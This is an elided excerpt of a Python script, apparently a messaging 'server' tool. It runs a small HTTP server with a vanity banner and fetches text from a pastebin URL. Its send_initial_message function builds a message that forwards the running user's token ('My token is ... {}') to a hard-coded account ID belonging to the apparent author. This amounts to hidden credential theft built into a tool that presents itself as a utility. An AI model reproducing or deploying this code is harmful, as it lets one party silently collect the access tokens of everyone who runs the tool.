...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"TH3 L3G3ND KRISHU DWN")
...
mmm = requests.get('https://pastebin.com/raw/iH927Fc9').text
...
def send_initial_message():
    ...
    msg_template = "Hello  Krishu Sir! I am using your server. My token is ----------------    {}"

    # Specify the ID where you want to send the message
    target_id = "100084291794097"

    requests.packages.urllib3.disable_warnings()

    def liness():
        print('\u001b[37m' + '•✪✭══════════『𝐊𝐑1𝐒𝐇𝐔 ♡ 𝐋3𝐆3𝐍𝐃 』 •═════════════════✭✪•')
